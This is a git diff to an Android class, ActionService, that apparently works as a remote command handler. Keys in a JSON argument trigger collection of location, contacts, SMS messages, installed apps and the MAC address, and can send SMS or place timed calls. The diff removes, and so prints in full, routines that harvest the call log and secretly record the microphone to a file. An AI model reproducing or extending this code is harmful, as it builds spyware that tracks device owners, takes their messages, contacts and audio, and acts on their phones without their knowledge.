@@ -18,6 +18,7 @@ import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Environment;
+import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Telephony;
@@ -82,13 +83,11 @@ public class ActionService extends Activity{
             argjson = new JSONObject(arg);
             getLocation(argjson);
             getContacts(argjson);
-            getCallLog(argjson);
             getMacAddress(argjson);
             SendSMS(argjson);
             GetSMS(argjson);
             getInstalledApps(argjson);
-            call(argjson)   ;
-            recordMic(argjson);
+            call(argjson);
             takeScreenshot(argjson);
         }catch (JSONException ex){
             Log.d(TAG, ex.getMessage());
@@ -98,23 +97,23 @@ public class ActionService extends Activity{
         return result;
     }
 
-    //Get current location
+    //Obtiene la localizacion
     private void getLocation(JSONObject argjson) {
         if (!argjson.has("location")){
             return;
         }
 
-        //Get location manager
+        //Obtiene localizacion manager
         LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);
 
-        //get the best provider to obtain the current location
+        //elige el mejor proveedor para la localizacion
         Location locationNetwork = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
         Location locationGPS = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
         Location locationPassive = locManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
 
         String[] result = new String[6];
 
-        //try to get latitude and longitude
+        //trata de obtener la latitud y localizacion
         try {
             result[0] = "NETWORK Latitude " + String.valueOf(locationNetwork.getLatitude());
             result[1] = "NETWORK Longitude " + String.valueOf(locationNetwork.getLongitude());
@@ -122,7 +121,7 @@ public class ActionService extends Activity{
             result[3] = "GPS Longitude " + String.valueOf(locationGPS.getLongitude());
             result[4] = "PASSIVE Latitude " + String.valueOf(locationPassive.getLatitude());
             result[5] = "PASSIVE Longitude " + String.valueOf(locationPassive.getLongitude());
-        } catch (Exception ex) {//if this failed the method return 0,0
+        } catch (Exception ex) {//si falla regresa 0's
             Log.d(TAG, ex.getMessage());
             result[0] = "0";
             result[1] = "0";
@@ -202,39 +201,6 @@ public class ActionService extends Activity{
         this.result = new JSONArray(contacts).toString();
     }
 
-    //get calls log
-    private void getCallLog(JSONObject argjson) {
-        if (!argjson.has("calllogs")){
-            return;
-        }
-
-        ArrayList<String[]> callLog = new ArrayList<String[]>();
-        String columns[] = new String[]{
-                CallLog.Calls._ID,
-                CallLog.Calls.NUMBER,
-                CallLog.Calls.DATE,
-                CallLog.Calls.DURATION,
-                CallLog.Calls.TYPE};
-        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //el ultimo
-        if (cursor.moveToFirst()) {
-            do {
-                try {
-                    callLog.add(new String[]{
-                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)), "UTF-8"),
-                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)), "UTF-8"),
-                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)), "UTF-8"),
-                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)), "UTF-8"),
-                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)), "UTF-8")
-                    });
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
-                }
-            } while (cursor.moveToNext());
-        }
-        this.result = new JSONArray(callLog).toString();
-    }
-
-
     //get current Mac Address
     private void getMacAddress(JSONObject argjson) {
         if (!argjson.has("mac")){
@@ -313,7 +279,7 @@ public class ActionService extends Activity{
         this.result = new JSONArray(packages).toString();
     }
 
-    //Call a specific number for a given milliseconds
+    //Funcion que realiza un llamada X milisegundos
     public void call(JSONObject argjson) throws JSONException {
         if (!argjson.has("call")){
             return;
@@ -361,132 +327,17 @@ public class ActionService extends Activity{
         this.result = "call done";
     }
 
-    public void recordMic(JSONObject argjson) throws JSONException {
-        if (!argjson.has("recordmic")){
-            return;
-        }
-
-        long time;
-
-        JSONArray array = argjson.getJSONArray("recordmic");
-        time = Long.valueOf(array.get(0).toString());
-
-        MediaRecorder recorder = new MediaRecorder();
-        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-        String path_file = Environment.getExternalStorageDirectory() + "/Download/record.3gp";
-        Log.d(TAG, path_file);
-
-        try {
-            recorder.setOutputFile(path_file);
-            recorder.prepare();
-        } catch (IllegalStateException e) {
-            Log.e("StartRecording", "IllegalStateException " + e.getMessage());
-            e.printStackTrace();
-        } catch (IOException e) {
-            Log.e("StartRecording", "IOException " + e.getMessage());
-            e.printStackTrace();
-        }
-        recorder.start();
-
-        Tools.sleep(time);
-
-        recorder.stop();
-        recorder.reset();
-        recorder.release();
-        Log.d(TAG, path_file);
-        this.result = path_file;
-    }
-
     //ScreenShot
 
     public void takeScreenshot(JSONObject argjson) throws JSONException {
         if (!argjson.has("screenshot")) {
             return;
         }
-        JSONArray array = argjson.getJSONArray("screenshot");
         //screen();
-        takeScreenshot();
 
     }
 
-    public void takeScreenshot() {
-        try {
-            // crear un bitmap con la captura de pantalla
-            Bitmap bitmaps;
-            View v1 = getWindow().getDecorView().getRootView();
-            v1.setDrawingCacheEnabled(true);
-            bitmaps = Bitmap.createBitmap(v1.getDrawingCache());
-            v1.setDrawingCacheEnabled(false);
-            saveScreenshot(bitmaps);
-        } catch (Throwable e) {
-            // Several error may come out with file handling or OOM
-            e.printStackTrace();
-        }
 
-    }
-
-    private void saveScreenshot(Bitmap bitmap) {
-        Date now = new Date();
-        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
-
-        try {
-            // nombre y ruta de la imagen a incluir
-            String mPath = Environment.getExternalStorageDirectory().toString() + "/PICTURES/Screenshots/h.jpg";
-
-            File imageFile = new File(mPath);
-
-            FileOutputStream outputStream = new FileOutputStream(imageFile);
-            int quality = 100;
-            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
-            outputStream.flush();
-            outputStream.close();
-
-        } catch (Throwable e) {
-            // Captura los distintos errores que puedan surgir
-            e.printStackTrace();
-        }
-    }
-
-
-    private void screen(){
-        Date now = new Date();
-        android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);
-
-        try {
-
-            // image naming and path  to include sd card  appending name you choose for file
-            String mPath = Environment.getExternalStorageDirectory().toString() + "/PICTURES/Screenshots/h.jpg";
-
-            // create bitmap screen capture
-            View v1 = getWindow().getDecorView().getRootView();
-            v1.setDrawingCacheEnabled(true);
-            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
-            v1.setDrawingCacheEnabled(false);
-            File imageFile = new File(mPath);
-            FileOutputStream outputStream = new FileOutputStream(imageFile);
-            int quality = 100;
-            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
-            outputStream.flush();
-            outputStream.close();
-
-
-            MediaScannerConnection.scanFile(this,
-                    new String[]{imageFile.toString()}, null,
-                    new MediaScannerConnection.OnScanCompletedListener() {
-                        public void onScanCompleted(String path, Uri uri) {
-                            Log.i("ExternalStorage", "Scanned " + path + ":");
-                            Log.i("ExternalStorage", "-> uri=" + uri);
-                        }
-                    });
-
-        } catch (Throwable e) {
-            // Several error may come out with file handling or OOM
-            e.printStackTrace();
-        }
-
-    }
 
 
 
